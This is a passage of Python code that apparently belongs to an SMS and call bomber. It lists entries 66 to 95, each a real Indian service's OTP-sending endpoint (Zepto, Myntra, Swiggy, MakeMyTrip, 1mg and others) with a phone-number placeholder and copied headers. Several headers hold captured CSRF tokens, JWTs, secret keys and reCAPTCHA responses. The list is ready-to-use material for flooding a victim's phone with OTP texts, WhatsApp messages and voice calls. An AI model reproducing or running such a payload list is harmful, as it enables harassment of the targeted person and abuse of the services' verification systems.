        "body": {"phoneCode": "91", "mobile": "{no}", "whatsappOption": False, "reCaptchaResponse": "0cAFcWeA7BnwmKiiOtCYj67Rw-QpreM8nKQQRaNTb62qas8O9uDlGTwg82HJS175qcWAI_HujQObkbg6FS8WH5rm_HUYMD0SH53quzDgzc70FiiOmGsdeUMUdh7etOFj4ixwyeCEDxB2tZlSOLDqnEF4txpYDLQX19Y3VAduSpsCohZCdHdReBn1QMsQrquPivsIxT3IDuNU1TLbvkz2XuAKJdsF2TSE1MlJU8XC2yHfF0qy46-xslvw7XbQNZf3bkL6ejwEO6PQ9QlLbfpNXmIWYNpUafFrziU0T4MlSt5LiFEftkMSTNIsBsfNroZj1qPpM5QYpvWh3fCtnBeAYlO8sa1wGf8I6ZHRRkBGE9cDznnvdTTTZvB3dPz0BXomgr0zj9hC4aTDDb_wX9bzZbHAmtHqAMYblPRUXcx5nL3zVZA36u3V7oXD-Bq3hjluMAuNRSEpe0-vvdU6r7KVOz5iUQDnDSQcSMC2PEpsIXZXRW8Ct09WHD0cfVhQ6s-QADv5S8LQxB9F0nym6IpewESdrYFpxPYUFamLILJzqfyQ4h9w_0HeCgmy-i6Opd6mV8yuw5XxoGU9Qwm4IKOFUApAgpwUqJh7IBlWZeUtGOMQ3g1H0z3TmffL5HQ0JRgehifwk-zMHvqkfJMqfyPFDqpc_sGnYeALnpMamLkkMbx_YfSp5KmuK7x3XFZj3yQ5JlNy3NZiYvTeUdR-UIO7Qlhh7YQfurIMmUO3qR98JTai3aYZFtdjsD4KMzj_75WjH_WG1NMtzqL8ylYfIlK2hCEU2HMJ3OTFuheJtEspiq0fa3tJarlAE8QBEZxwF7MTK7ryr5DifMC_4fUS2tgS2bEh3Km_z_wPNp6RWVK4JsIqYT6wWFbE7_OWV4_ASIEUgvzHljrOjhr0Aqni0OYW2Of6zGCLXxQvz9g1NPPPKpXFBoN72aYj09R9tgWs3HzUQo05sOnPGWbMw5j81m-j-BcgH8aW2LfnroOHTuLndPNTUoqLn294YITny0rBhFqMqdXWTo80DRFERzikzTm-l-jzDoahxWvJow7P4k5GEufj5vjFuGBareJTQTjlbxZ5jQLlloqfhhcgMQ"}
    })
    
    # 66. Smytten
    apis.append({
        "name": "Smytten",
        "url": "https://route.smytten.com/discover_user/users/loginViaNumber",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "request_type": "web",
            "web_version": "1",
            "uuid": "443f5efc-cd03-4922-8302-319c9596c90d",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"ad_id": "", "device_info": {}, "device_id": "", "app_version": "", "device_token": "", "device_platform": "web", "value": "{no}", "guest_user_access": True, "recaptcha_token": "0cAFcWeA4QeqXYr-3ef2gC7FXoNoCrvtXqiS0mGbRwkSBC7nN1TGp4EupoRe0WJVGUH4ztzLjwSQiElpMe2S-sHEUAsoz8z_xgHpSo5EBLIjZT7O--rd4lZvocPW2f8S24u7CIwJSolBHvO5e2gHYzsF_gsZMqDE5NKDg50nehbuUkhXmH6m1ZbrgBrbLEShKcqanIcUWejhaxppzjT9flLBy04d9WHC8LrBzm31yt_w3jpYLt5jHcgwEnCdwfM-TGHhYq-eW0-J44HxhNbGzLXPW6U82yoMyGEyApQZ-hZYMfjRAfMz8WYhMwrRv8bGJj6C7RP77Fyk8iGhJfDBaSPKgvB8d3zArNjtKRgf9iR9hYCyigu88n6ajgKQCeyCg77fvjrLmZK6fzHVoIJo2DJKCieVZC1QSP9bKa_vP0XyzCjYfhBkBUpcUjG7LRiy81ikzrqPqQ6XeUs1jHl4akgN2F0Ty6No8F7dQ_cllZQMIi-Inpdd2ZJZBs4B-Qub6tOBPl4bRjB4hIzQzFcb9QEZc_Sti6qO0_RI6CmoWh_GKLoc4odguBqKUrqMMXpAjzjsLf9Fb59bGiIKRPcLo3N-EQECdUYjs-tN9Fuwe5A6yOp7ZbhFitmBY52rU31VtxQVmHHZvqH7DrsPMtXs0FGJC4x1QhDIsxbIjgR0ZBo1S1BBMcdF8cun4tZOi3slh-RXNyd4q52ovC7tXjvVhgHTtuA69y2LmNsISKpuxymxmDwij48e_WG_mAK0vFUfHzCQIosADHb2yaKsy4hN4VE-3UhWNcpablADYqo2XDuOHAj235AK-kK9Z5069a5FgJ9mc_2FAqCWXZJIKPPQyRwSVos2q1sHNXTLC2AaFVgN-zz-FSKHk0XvA72gn0Mgxhy003JBlVUjUDlckId69rbCcP4zZ5-wSZEV9LfW-DO1sj1CNe0LJkUoS-Vz0OXfUs-NUcySHs1bMHbl_vsJbc5dzi7Q5Oem20th-5Uodo1RQigG_9t6qhhIO6NUO63he52csRj4tXTJkuaJ3m16pMqO791pr75M8szXIpcS-qnafXG5AZju1xIYKJ_NX4cpQhLzoMFa0G16afduI589TjD1ftZmC-ZtTiey6hLBs5rxonIlKPottISovBfN1BampSKvFNHryHFyjfWmr3mcijnz9MsOa1LyIOHsaDT3ry7ctOswcfXbIw2eD_mQRozynPQ9Wd_p9IYmbpj-WOiG0jzb048Mi_iG1HRJlWck2gID9XjVxn8pzdWNAF6fYEj6EpTIZtEh9CyZu9XNuTXoLH1EZ4PBjuKDaNipscBZWnxxZQ-dSg_uPEyuosLpsLescCnJCWWJbB4TPGpOirAQsMoZMKLq5Cm8nfnSJsMsFwd9Tki3wkrvR8mEvEAsbmWX5rY7x4ebyD9xmznjb1-0RtS35xxwaUIDvrFlyX0QFLqH3TDUIfObXF3-S6sxe2qH7hl2U30Qhtb8gh4lS8DROr-fRlGTu3MethG6FXHWdTfM-rgiqqsp9Jl2dpitsaLa2xGiVnn1zx86FY_lSL95oNwx_uCdJQExQKGLKKWswUaJk6NwC5U4daGP-0nAcdq9Xb21kDJnjine3gbp_3NeiFxiyJsBSqJG7RHewvmclzTlrPDCF531ny8rPxvO39e3EG3N87nieDwcPaQR6Gq2aZbR8_4Rx0fmgza4SHyAs22CMupxw4GfOb2kMkc-zU6hgClRDozCtorpHa9fRPxurQ73_9t2LUL-ImQUzM-_VSkK6ELAgi-8fyziSuABW9u8wI7R65LiUkRrB3c7jTChs1XyWih4nastvQA6PbQB6rA3ZmcgOP0MBi_47jSq_3Nmvujjj_ZAIgrQGIoQYbsUVkDNi4AuaV7cZFGwGEjKx5NiRSBW1AfTvfNN-xKNgdHPPZMQV2cxZhwM9ZBGGcKR7WKv3V6LaGWbp_rm-5HDzzWrq4Me5bi3Yr1KUCCiNQvI01pdY98SE9HJD9XwaRp7Ioj_kP76cqJO4ND1L8mniZ_UwSLbEvtd4o-Z6zSjMvvlBab6m_e3T4lcdp0hHCYJVGvu6C1XSDEKTEwxSA4MYHOOzmxnoH8NsbrZS0YfAzST-hgtXCBU8ZVNHw-PgyAx3YlGx3iyWZR8Cmt5Ky1HAj4QxNhFmUrPVUipxAP5HRohTEaGFgwmUWlRNAmhEq6dFHrVGEUat-YaJoanMNUDoSNHu5hv_5AjgDpzx3TAwulB_Nm3mAgMlAPb3PehkRKhPKihjKZlC8aQXmpLeNjodX-QDGTMWjYK8HzmOdnNK5IzkWTDlFqmp1LJRX"}
    })
    
    # 67. GoKwik
    apis.append({
        "name": "GoKwik_V4",
        "url": "https://gkx.gokwik.co/v4/auth/otp/login/trigger",
        "method": "POST",
        "headers": {
            "gk-version": "20260604161019988",
            "gk-timestamp": "59353012",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc4MDU5MDM3OCwiZXhwIjoxNzgwNTkwNDM4fQ.HQnTgV7o3vgDNbiMg-0XWgF6xZFfHWXxZyvjSnBumvI",
            "gk-signature": "631740",
            "gk-udf-1": "1016",
            "gk-platform": "shopify",
            "gk-request-id": "2f6215ff-1435-463f-b15a-e641c13efa6d",
            "gk-source": "kp",
            "Content-Type": "application/json",
            "gk-merchant-id": "12wyqc2lkv1ku5f576t",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"phone": "{no}", "country": "IN"}
    })
    
    # 68. Zepto
    apis.append({
        "name": "Zepto",
        "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        "method": "POST",
        "headers": {
            "bundleversion": "v1",
            "session_id": "5d03725a-db53-422e-8eee-dfa679074ef6",
            "marketplace_type": "SUPER_SAVER",
            "accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "x-csrf-secret": "eG2qwUlgV_U",
            "platform": "WEB",
            "auth_revamp_flow": "v2",
            "request-signature": "4475c3c08dad33af3a0f2538f076222fe1593a8061a4d388780051e6852af69c",
            "x-xsrf-token": "S7GXi7I9ud_DyBtebfABN:U-v8ulsLiDSyk42yRxXpyRfJOIY.I9uHoq5tHOhmRGpKfJWkBp5aPjeE9MyVf1WflypAzfY",
            "auth_from_cookie": "true",
            "storeid": "b4dc8d65-ed2e-4142-81b6-373982b13500",
            "deviceid": "e012d1c6-52f0-4606-aa2f-126ecdb41e2f",
            "appversion": "16.1.1",
            "x-timezone": "ca259e9b2adbaddb76c472ae45210a98d09d19418b2a84c3eeb7d9c2b16a71cc",
            "tenant": "ZEPTO",
            "device_id": "e012d1c6-52f0-4606-aa2f-126ecdb41e2f",
            "sessionid": "5d03725a-db53-422e-8eee-dfa679074ef6",
            "app_version": "16.1.1",
            "source": "DIRECT",
            "app_sub_platform": "WEB",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobileNumber": "{no}", "countryCode": "+91"}
    })
    
    # 69. Agoda
    apis.append({
        "name": "Agoda",
        "url": "https://www.agoda.com/ul/api/v1/auth",
        "method": "POST",
        "headers": {
            "ul-fallback-origin": "https://www.agoda.com",
            "ul-app-id": "mspa",
            "ag-request-id": "037aa8ad-6a0a-4464-b08a-0bdd694dba38",
            "Content-Type": "application/json; charset=utf-8",
            "ag-initiator-version": "mock-appVersion",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"email": "", "keepMeSignedIn": False, "whatsapp": "+{no}"}
    })
    
    # 70. Mpokket
    apis.append({
        "name": "Mpokket",
        "url": "https://web-api.mpokket.in/registration/sendOtp/sign-up",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Authorization": "Bearer",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"payload": "U2FsdGVkX1/eb9kMqF3HgTIL63xwEgDkzfVoASZufOdHHizpf9UKLyTQY9wB2QeRQV4AUjUwkDRExNOgrBRMS/qj6Zjb9y5hsqlrDkP57ReM1J8ZFMoif7vEKGNM2gcy/MoebRAP2aedf31rCJtXu/HB32hg8T6gI7JxRjXFyQ7HcpxvzWis5uVQRAAuYWtHOa1ZjUgUHVXn2yZJallHxw4pdhzbDX0WAQIkDsZNU2nX8lk8pbUBfhxjKmcy0iRk"}
    })
    
    # 71. Penpencil
    apis.append({
        "name": "Penpencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp",
        "method": "POST",
        "params": {"smsType": "2"},
        "headers": {
            "Host": "api.penpencil.co",
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.9.1"
        },
        "body": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{no}"}
    })
    
    # 72. SmartCoin
    apis.append({
        "name": "SmartCoin",
        "url": "https://webapp.smartcoin.co.in/webflow/pre_auth/otp/request",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "user_platform": "WEBFLOW",
            "platform_code": "olyv",
            "origin": "https://app.olyv.co.in",
            "referer": "https://app.olyv.co.in/"
        },
        "body": {"phone_number": "{no}", "app_version": "100101", "channel": "IVR", "request_type": "REGISTRATION", "onboarding_consent": True}
    })
    
    # 73. TataCapital Voice
    apis.append({
        "name": "TataCapital_Voice",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "headers": {
            "Host": "mobapp.tatacapital.com",
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.9.1"
        },
        "body": {"phone": "{no}", "applSource": "", "isOtpViaCallAtLogin": "true"}
    })
    
    # 74. 1mg - SMS
    apis.append({
        "name": "1mg_SMS",
        "url": "https://www.1mg.com/pwa-api/auth/create_token",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "HKP-Platform": "Healthkartplus-0.0.1-mobileweb",
            "Accept": "application/vnd.healthkartplus.v4+json",
            "X-Visitor-Id": "296d1933-92dd-45dd-88cf-66a3a9a37288_Jx91Pq9yAP_6492_1780163827000",
            "VISITOR-ID": "296d1933-92dd-45dd-88cf-66a3a9a37288_Jx91Pq9yAP_6492_1780163827000",
            "x-platform": "mobileweb-0.0.1",
            "X-Access-Key": "1mg_client_access_key",
            "X-1mgLabs-Platform": "mWeb",
            "locale": "en",
            "x-csrf-token": "63db2a2a082045df7f714c237e6c15fa30af71e0521bf98323ba4b40fbfaf838e1241639824024e9c4655f967363dc5bcc26a0f1cd3d5b46fd27b34b1dfdbf1f",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"referral_code": None, "number": "{no}"}
    })
    
    # 75. 1mg - Call
    apis.append({
        "name": "1mg_Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "headers": {
            "Accept": "application/vnd.healthkartplus.v11+json",
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.9.1"
        },
        "body": {"number": "{no}", "is_corporate_user": False, "otp_on_call": True}
    })
    
    # 76. Unacademy
    apis.append({
        "name": "Unacademy",
        "url": "https://unacademy.com/api/v3/user/user_check/",
        "method": "POST",
        "params": {"enable-email": "true"},
        "headers": {
            "Host": "unacademy.com",
            "Content-Type": "application/json; charset=utf-8",
            "Accept-Encoding": "gzip",
            "User-Agent": "okhttp/3.9.1"
        },
        "body": {"country_code": "IN", "phone": "{no}", "is_un_teach_user": False, "otp_type": 2.0, "send_otp": True, "email": ""}
    })
    
    # 77. Doubtnut
    apis.append({
        "name": "Doubtnut_Login",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {
            "Host": "api.doubtnut.com",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "User-Agent": "okhttp/3.9.1"
        },
        "body": {"app_version": "7.10.51", "aaid": "538bd3a8-09c3-47fa-9141-6203f4c89450", "phone_number": "{no}", "language": "en", "udid": "b751fb63c0ae17ba", "gcm_reg_id": "eyZcYS-rT_i4aqYVzlSnBq:APA91bEsUXZ9BeWjN2cFFNP_Sy30-kNIvOUoEZgUWPgxI9sKGS6MlrzZOwbp5FD6dFqUROZTqaaEoLm8aLe35Y-ZUfNtP4VluS7D76HFWQ0dglKpIQ3lKvw"}
    })
    
    # 78. Doubtnut Call
    apis.append({
        "name": "Doubtnut_Call",
        "url": "https://micro.doubtnut.com/otp/send-call",
        "method": "POST",
        "headers": {
            "Host": "micro.doubtnut.com",
            "Accept": "*/*",
            "Version_Code": "1160",
            "Device_Model": "ASUS_I005DA",
            "Android_SDK_Version": "28",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "okhttp/5.0.0-alpha.2"
        },
        "body": {"phone": "{no}", "locale": "en"}
    })
    
    # 79. RummyCircle
    apis.append({
        "name": "RummyCircle",
        "url": "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
        "method": "POST",
        "headers": {
            "Host": "www.rummycircle.com",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
        },
        "body": {"otpOnCall": True, "mobile": "{no}", "otpType": 8.0, "transactionId": 1.708139023656E12}
    })
    
    # 80. OLX Call
    apis.append({
        "name": "OLX_Call",
        "url": "https://www.olx.in/api/auth/authenticate",
        "method": "POST",
        "params": {"lang": "en-IN"},
        "headers": {
            "Host": "www.olx.in",
            "Content-Type": "application/json",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br",
            "User-Agent": "okhttp/3.9.1"
        },
        "body": {"method": "call", "phone": "{no}", "language": "en-IN", "grantType": "retry"}
    })
    
    # 81. ShopClues
    apis.append({
        "name": "ShopClues",
        "url": "https://www.shopclues.com/ajax/send_login_otp.php",
        "method": "POST",
        "headers": {
            "Host": "www.shopclues.com",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": "mobile={no}"
    })
    
    # 82. Indiamart
    apis.append({
        "name": "Indiamart",
        "url": "https://m.indiamart.com/mobile/api/register_mobile.php",
        "method": "POST",
        "headers": {
            "Host": "m.indiamart.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": "mobile_no={no}&action=send_otp"
    })
    
    # 83. Justdial
    apis.append({
        "name": "Justdial",
        "url": "https://www.justdial.com/functions/otp/send_otp.php",
        "method": "POST",
        "headers": {
            "Host": "www.justdial.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": "mobile={no}&type=login"
    })
    
    # 84. PolicyBazaar
    apis.append({
        "name": "PolicyBazaar",
        "url": "https://www.policybazaar.com/api/user/generate_otp/",
        "method": "POST",
        "headers": {
            "Host": "www.policybazaar.com",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobile": "{no}"}
    })
    
    # 85. PaisaBazaar
    apis.append({
        "name": "PaisaBazaar",
        "url": "https://www.paisabazaar.com/api/user/send-otp/",
        "method": "POST",
        "headers": {
            "Host": "www.paisabazaar.com",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobile_number": "{no}"}
    })
    
    # 86. IndiaLends
    apis.append({
        "name": "IndiaLends",
        "url": "https://indialends.com/pl/SP_MVResend",
        "method": "POST",
        "headers": {
            "Host": "indialends.com",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36",
            "Accept": "*/*",
            "Referer": "https://indialends.com/personal-loan",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
        },
        "body": "MobileNumber={no}&Mode=2"
    })
    
    # 87. Astrosage Call
    apis.append({
        "name": "Astrosage_Call",
        "url": "http://varta.astrosage.com/sdk/send-otp-via-call",
        "method": "GET",
        "params": {"callback": "myCallback", "countrycode": "91", "phoneno": "{no}", "deviceid": "", "operation_name": "blank", "jsonpcall": "1", "fromresend": "0", "_": "0"},
        "headers": {
            "Host": "varta.astrosage.com",
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Accept": "*/*",
            "X-Requested-With": "pure.lite.browser",
            "Referer": "http://www.astrosage.com/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
        },
        "body": {}
    })
    
    # 88. Astrosage Register
    apis.append({
        "name": "Astrosage_Register",
        "url": "http://varta.astrosage.com/sdk/registerAS",
        "method": "GET",
        "params": {"callback": "myCallback", "countrycode": "91", "phoneno": "{no}", "deviceid": "", "operation_name": "blank", "jsonpcall": "1", "fromresend": "0", "_": "0"},
        "headers": {
            "Host": "varta.astrosage.com",
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3081 Build/RKQ1.211119.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/131.0.6778.135 Mobile Safari/537.36",
            "Accept": "*/*",
            "X-Requested-With": "pure.lite.browser",
            "Referer": "http://www.astrosage.com/",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8"
        },
        "body": {}
    })
    
    # 89. MagicPin - Call
    apis.append({
        "name": "MagicPin_Call",
        "url": "https://webapi.magicpin.in/ultron-web/sentAuthOtp_v2/",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "sec-ch-ua-platform": "Android",
            "auth-secret-key": "kQLMCQBrfevxhzuPpFWT",
            "sec-ch-ua": "Android WebView\";v=\"143\", \"Chromium\";v=\"143\", \"Not A(Brand\";v=\"24\"",
            "sec-ch-ua-mobile": "?1",
            "origin": "https://magicpin.in",
            "x-requested-with": "mark.via.gp",
            "referer": "https://magicpin.in/",
            "accept-language": "en-IN,en-US;q=0.9,en;q=0.8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; M2103K19I Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.7499.115 Mobile Safari/537.36"
        },
        "body": {"phoneNumber": "91{no}", "authMethod": "call", "token": "0cAFcWeA61Qx8xkm_zXvmkoN9GMx8ROX6pW1nwcmm3KKwrxTOTmWC8ji_Dv0M0tcYNgudFfpIfVmZ-LSZ_N9fEJqiaE8mNfT7hQQJfg1uF2kTKPpjpJR6EqO24XHaV0te5q3JJr9KHf72BcQ7qpofk54cjhzGRokezbp1L5sw_vtU7SVHtLMBd-23SO3fq45fcpYnl7s9FHGUtD2lDWQIK7HVX1mjdiWngr1bX5XbU-m270eshEgAagJi5kOCHb4fPAttbYn0zDc859bEmrAJhSRWtlZT3GGK-WMvveRGhCtsqB2mILH2HCZy0rlk4ms0oeeNQ_ckGYlWJkOnBXj-knZExHaiReG5FIHk0pvMQ1AzesjH4XRNITN6MLA97e2hU8P3yeKK1uibPO9uZsn89IZX7i6IzRZCecJO0Vafv6Xm7EP8lJQq9YKIF3e9RIEXXDxc8xyr6P8oaegdyRtwAVs4j_kaXDYGIO5wid6A1tbIrEPs1qFGT_qAsSoS3VEvshELSCxDC87f8MZrt6zLPSHtXQXENrDK0eHWTeRiQ0H-Ilh2nPUUKTrYK-hbMBwiGkbow1DBJbCDlHVs4nds1yDy6JJi3-C1FeSE_5yW7g1jUfyoYc5PyKKGrP-5iQtXQ-fAYsF38gxTXuEqXm8BqRetWT3cN4RBXzoB8GNl2qxd4l33i2S-aPNtmjUREcXLVbQJMN8E6sb8MPkrq6et4sUWTBwNnBgLZeXgm5dFSI9N6NTWwruifvLpuJ2_tQ9OGcy_OIl_M1XkRfwSdQA9Vk9nMQOPgn07B-DSY7j4lYniu-HsVldAhAK4"}
    })
    
    # 90. Udaan - SMS
    apis.append({
        "name": "Udaan_SMS",
        "url": "https://auth.udaan.com/api/otp/send",
        "method": "POST",
        "params": {"client_id": "udaan-v2", "whatsappConsent": "true"},
        "headers": {
            "host": "auth.udaan.com",
            "sec-ch-ua-platform": "Android",
            "accept-language": "en-IN",
            "sec-ch-ua": "Chromium\";v=\"148\", \"Android WebView\";v=\"148\", \"Not/A)Brand\";v=\"99\"",
            "sec-ch-ua-mobile": "?1",
            "traceparent": "00-35a5ece9b9b22b0ff13de1eeb21e8ab9-30e4761fdc9e2b79-00",
            "x-app-id": "udaan-auth",
            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
            "origin": "https://auth.udaan.com",
            "x-requested-with": "mark.via.gp",
            "referer": "https://auth.udaan.com/login/v2/mobile?cid=udaan-v2&cb=https%3A%2F%2Fudaan.com%2F_login%2Fcb&v=2"
        },
        "body": "mobile={no}"
    })

    # ========== NEW ULTIMATE_APIS (91-110) ==========
    
    # 91. Quikr
    apis.append({
        "name": "Quikr",
        "url": "https://www.quikr.com/core/register",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobile": "{no}"}
    })
    
    # 92. Myntra
    apis.append({
        "name": "Myntra",
        "url": "https://www.myntra.com/gateway/v1/auth/getotp",
        "method": "POST",
        "headers": {
            "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjMwNjIwNzEiLCJhcCI6IjcxODQwOTI1MSIsImlkIjoiYjQzODhlMzg1ODlkMTlmZiIsInRyIjoiYmNjNjExMDE0YmRjOGQwMGNiYmJlNWE4MTg1Yjg4Y2UiLCJ0aSI6MTc4NjA3NzE3ODg2MywidGsiOiI2Mjk1Mjg2In19",
            "traceparent": "00-bcc611014bdc8d00cbbbe5a8185b88ce-b4388e38589d19ff-01",
            "tracestate": "6295286@nr=0-1-3062071-718409251-b4388e38589d19ff----1786077178863",
            "X-myntraweb": "Yes",
            "X-Requested-With": "browser",
            "x-location-context": "pincode=212622;source=IP",
            "x-meta-app": "deviceId=739ea08d-4757-4531-877d-f542e23870ed;appFamily=Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36;reqChannel=mweb;channel=web;",
            "Content-Type": "application/json",
            "deviceId": "739ea08d-4757-4531-877d-f542e23870ed",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"phoneNumber": "{no}", "signup": "ONECLICK"}
    })
    
    # 93. MakeMyTrip SMS
    apis.append({
        "name": "MakeMyTrip_SMS",
        "url": "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP",
        "method": "POST",
        "params": {"region": "in", "language": "eng", "currency": "inr"},
        "headers": {
            "Content-Type": "application/json",
            "vid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
            "tid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
            "usr-mcid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
            "deviceid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
            "Authorization": "h4nhc9jcgpAGIjp",
            "Accept": "application/json",
            "visitor-id": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
            "region": "in",
            "language": "eng",
            "currency": "inr",
            "user-currency": "INR",
            "user-country": "IN",
            "entity-name": "india",
            "user-identifier": "{\"ipAddress\":\"ipAddress\",\"imie\":\"imie\",\"appVersion\":\"2.0.0\",\"deviceId\":\"d8a3a42f-1852-4ec7-aa6b-d715268e93b0\",\"os\":\"PWA\",\"osVersion\":\"osVersion\",\"timeZone\":\"timeZone\",\"type\":\"mmt-auth\",\"deviceOrBrowserInfo\":\"Chrome\",\"profileType\":\"0\"}",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"loginId": "{no}", "type": 6, "isEncoded": False, "channel": ["MOBILE"], "transactionId": False, "appHashKey": "@www.makemytrip.com #", "countryCode": "91"}
    })
    
    # 94. MakeMyTrip WhatsApp
    apis.append({
        "name": "MakeMyTrip_WhatsApp",
        "url": "https://mapi.makemytrip.com/ext/web/pwa/send/token/SIGNUP_OTP",
        "method": "POST",
        "params": {"region": "in", "language": "eng", "currency": "inr"},
        "headers": {
            "Content-Type": "application/json",
            "vid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
            "tid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
            "usr-mcid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
            "deviceid": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
            "Authorization": "h4nhc9jcgpAGIjp",
            "Accept": "application/json",
            "visitor-id": "d8a3a42f-1852-4ec7-aa6b-d715268e93b0",
            "region": "in",
            "language": "eng",
            "currency": "inr",
            "user-currency": "INR",
            "user-country": "IN",
            "entity-name": "india",
            "user-identifier": "{\"ipAddress\":\"ipAddress\",\"imie\":\"imie\",\"appVersion\":\"2.0.0\",\"deviceId\":\"d8a3a42f-1852-4ec7-aa6b-d715268e93b0\",\"os\":\"PWA\",\"osVersion\":\"osVersion\",\"timeZone\":\"timeZone\",\"type\":\"mmt-auth\",\"deviceOrBrowserInfo\":\"Chrome\",\"profileType\":\"0\"}",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"loginId": "{no}", "type": 6, "isEncoded": False, "channel": ["MOBILE", "WHATSAPP"], "transactionId": False, "appHashKey": "@www.makemytrip.com #", "countryCode": "91"}
    })
    
    # 95. Swiggy Voice
    apis.append({
        "name": "Swiggy_Voice",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        },
        "body": {"mobile": "{no}"}
    })
    
